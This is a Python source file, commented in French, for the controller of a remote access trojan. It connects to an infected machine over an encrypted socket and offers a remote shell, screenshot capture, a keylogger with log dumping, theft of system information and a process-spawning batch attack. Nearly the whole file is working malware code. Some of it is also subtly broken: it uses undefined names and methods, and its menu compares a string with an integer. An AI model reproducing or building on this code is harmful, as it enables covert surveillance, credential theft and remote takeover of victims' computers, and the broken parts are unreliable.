import pyscreeze, pyscreenshot, socket, image,os, time, random, os.path
import base64

from threading import Thread, Event, Lock
from socket import socket, timeout, SHUT_RDWR
from sys import argv
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
from Crypto import Random
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes

from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.serialization import load_pem_private_key
import os, sys, platform, socket, time
from PIL import Image


#CONSTANTES
BUFFERSIZE=2048
ENCODING = 'UTF-8'
FICHIERLOG = 'infoSystem.log'
KEYFILE = 'key_file.txt'


class Client():

    def __init__(self):
        self.ip = 'localhost'
        self.port = 50001
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.KEY = "Fhtjbh54kObnEGHK"


    def connect(self): # Se connecte
        try:
            self.s.connect((self.ip, self.port))
        except socket.timeout: #Si délai atteint ERREUR
            self.disconnect()
            print("[!] Aucune réponse du client.")
        except:
            self.disconnect()
            print("[!] Erreur lors de la connexion.")

    def disconnect(self): # Se deconnecte
        self.s.close()

    def load_key_public(self):
        with open("key_client\key_pub_client.pem", 'rb') as pem_in: #On charge la clé publique depuis le fichier
            pemlines = pem_in.read()
            pubkey = load_pem_public_key(pemlines, backend=default_backend()) #On la rend utilisable en recréant la clé d'origine
        return pubkey

    def send_AES(self):
        public_key = self.load_key_public()
        cipher_key = public_key.encrypt(self.KEY.encode(ENCODING),
                                           padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                                        algorithm=hashes.SHA256(),
                                                        label=None))
        #A l'aide du chiffrement asymétrique RSA on envoie la clé AES
        self.s.send(cipher_key)


    def iv(self): #Crée un vecteur d'initialisation aléatoire
        return Random.new().read(AES.block_size)

    def do_encrypt(self, message):
        iv = self.iv() #Un chaque fois qu'un message est envoyé un nouveau iv est crée
        enc = AES.new(self.KEY.encode(ENCODING), AES.MODE_CFB , iv)
        print(message)
        cipherMessage = iv + enc.encrypt(message) #Et l'iv est envoyé avec le message
        print(cipherMessage)
        return cipherMessage

    def do_decrypt(self, cipherMessage):
        enc = AES.new(self.KEY.encode(ENCODING), AES.MODE_CFB, iv=cipherMessage[:16]) #On récupere l'iv en début de message
        #cipherMessage = base64.b64decode(cipherMessage)
        message = enc.decrypt(cipherMessage[16:]) #On déchiffre le reste du message"
        message = message.decode(ENCODING, errors='ignore')
        return message

    def run(self):

        print("En attente de connexion avec :" + self.ip)
        self.connection()
        print("Connexion etablie")
        self.send_AES()
        print("Recherche le systeme d'exploitation de la cible")
        self.getOperatingSystem()
        print("Recuperation du repertoire courant...")
        cwd = self.getCurrentWorkingDirectory() #cwd : Current Working Directory

        act = self.menu()
        while act != '0':
            self.task(act, cwd)
            act = self.menu()

    def menu(self):
        choix = -1
        while choix < 0 or choix > 7:
            print("0 : Quitter l'application")
            print("1 : Obtenir des informations")
            print("2 : Shell")
            print("3 : PrtScr")
            print("4 : Processus et dossiers à l'infini ")
            print("5 : Demarre le Keylogger")
            print("6 : Eteindre le Keylogger")
            print("7 : Relever les informations collecter par le keylogger")
            choix = int(input(" Choix :"))
        return choix

    def task(self, act, cwd):
        if act == 1:
            self.getSystemInformations()
        elif act == 2:
            cmd = input(cwd+'>')
            while cmd != 'exit()':
                shell = Shell(cmd, self.s, cwd, self.KEY)
                if cmd[:2] == 'cd':
                    shell.changeCurrentDirectory()
                    cwd = self.getCurrentWorkingDirectory()

                else:
                    shell.sendCmd()
                cmd = input(cwd + '>')

        elif act == 3:
            self.PrtScr()

        elif act == 4:
            self.sendBat()
        elif act == 5:
            self.keylogger("start")
        elif act == 6:
            self.keylogger("stop")
        elif act == 7:
            self.keylogger("dump")
        pass

    def getSystemInformations(self):
        cmd = 'getinfo'
        try:
            cmdCipher = self.do_encrypt(cmd.encode(ENCODING))
            self.s.send(cmdCipher)
        except:
            print('Echec')
        finally:
            message = ''
            # On fait une boucle qui va recevoir TOUTES les informations envoyees par notre malware
            while True:
                cipherData = self.s.recv(BUFFERSIZE)
                data = self.do_decrypt(data)
                message = message + data
                print(len(cipherData))

                if len(cipherData) < BUFFERSIZE:
                    # Dès qu'on ne recoit plus de donnees, on ecrit dans le fichier ce qu'on a recu
                    print('Ecriture du fichier : infoSystem.log')
                    with open(FICHIERLOG, 'a') as fichierLog:
                        fichierLog.write(str(message))
                    break
                else:
                    continue


    def getOperatingSystem(self):
         cmd = 'os'
         try:
             print(cmd)
             cmdCipher = self.do_encrypt(cmd.encode(ENCODING))
             self.s.send(cmdCipher)
         except:
             print("Recuperation du systeme d'exploitation échoué")
         finally:
            operatingSystem = self.s.recv(BUFFERSIZE)
            operatingSystem = self.do_decrypt(operatingSystem)
            print ("Le système d'exploitation est un : "+operatingSystem)

    def getCurrentWorkingDirectory(self):
        cmd = 'cwd'
        try:
            cmdCipher = self.do_encrypt(cmd.encode(ENCODING))
            self.s.send(cmdCipher)
        except:
            print("Recuperation du repertoire courant échoué")
        finally:
            cwd = self.s.recv(BUFFERSIZE)
            cwd = self.do_decrypt(cwd)
            print('[DEBUG] Receive CWD >', cwd)
            return cwd

    def getUserOrRoot(self, os): # Just for Linux
        cmd = 'uid'
        try:
            cmdCipher = self.do_encrypt(cmd.encode(ENCODING))
            self.s.send(cmdCipher)
        except:
            print("Recuperation UID échoué")
        finally:
            prompt = self.s.recv(BUFFERSIZE)
            prompt = self.decrypt(prompt).decode(ENCODING)
            return prompt

    def PrtScr(self):
        cmd = 'prtscr'
        try:
            cmdCipher = self.do_encrypt(cmd.encode(ENCODING))
            self.s.send(cmdCipher)
        except:
            print("Capture d'écran échoué")
        finally:
            strClientResponse = self.s.recv(BUFFERSIZE).decode(ENCODING)  # get info
            print("\n" + strClientResponse)
            intBuffer = ""
            for intCounter in range(0, len(strClientResponse)):  # get buffer size from client response
                if strClientResponse[intCounter].isdigit():
                    intBuffer += strClientResponse[intCounter]
            intBuffer = int(intBuffer)

            strFile = time.strftime("%Y%m%d%H%M%S" + ".jpg")
            ScrnData = self.s.recv(intBuffer)  # get data and write it
            objPic = open(strFile, "wb")
            objPic.write(ScrnData);
            objPic.close()

            self.displayPicture(strFile)

            print("Screenshot reçu" + "\n" + "Total bytes: " + str(os.path.getsize(strFile)) + " bytes")

    def displayPicture(self, name):
        try:
            picture = Image.open(os.getcwd()+'\\'+name)
        except:
            print ("Capture d'écran non trouvée")
        finally:
            picture.show()

    def keylogger(self, option):
        if option == "start":

            self.s.send(self.do_encrypt("keystart".encode(ENCODING)))
            if self.do_decrypt(self.s.recv(BUFFERSIZE)) == "error":
                print("Keylogger is already running.")

        elif option == "stop":
            self.s.send(self.do_encrypt("keystop".encode(ENCODING)))
            if self.do_decrypt(self.s.recv(BUFFERSIZE)) == "error":
                print("Keylogger is not running.")

        elif option == "dump":
            self.s.send(self.do_encrypt("keydump".encode(ENCODING)))
            intBuffer = self.do_decrypt(self.s.recv(BUFFERSIZE))

            if intBuffer == "error":
                print("Keylogger is not running.")
            elif intBuffer == "error2":
                print("No logs.")
            else:
                strLogs = self.do_decrypt(self.s.recv(BUFFERSIZE))  # On recupere les informations du keylogger
                print("\n" + strLogs)
                with open(KEYFILE, 'w') as key_file:
                    key_file.write(strLogs)

    def sendBat(self):
        cmd = 'bat'
        try:
            cmdCipher = self.do_encrypt(cmd.encode(ENCODING))
            self.s.send(cmdCipher)
        except:
            print("echoue")


class Shell(Client):
    def __init__(self, cmd: str, s, cwd, key):
        self.cmd = cmd
        self.s = s
        self.cwd = cwd
        self.KEY = key


    def sendCmd(self):
        cmdCipher= self.do_encrypt(self.cmd.encode(ENCODING))
        self.s.sendall(cmdCipher)
        result = self.s.recv(16384)
        result = self.do_decrypt(result)

        print(result)
        print("\n")

    def changeCurrentDirectory(self):
        self.s.send(self.do_encrypt(self.cmd.encode(ENCODING)))


go = Client()
go.run()







